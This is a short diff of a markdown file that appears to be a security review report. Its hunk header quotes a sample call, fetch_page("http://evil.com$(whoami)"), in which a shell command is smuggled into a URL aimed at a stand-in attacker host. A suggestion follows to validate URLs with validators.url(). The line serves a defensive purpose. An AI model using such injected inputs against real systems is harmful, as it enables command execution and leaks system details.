@@ -82,7 +82,8 @@ fetch_page("http://evil.com$(whoami)")
 
 **Suggestion:**
 URL validation with `validators.url()` before processing
-```
+
+---
 
 ### Response Times
 
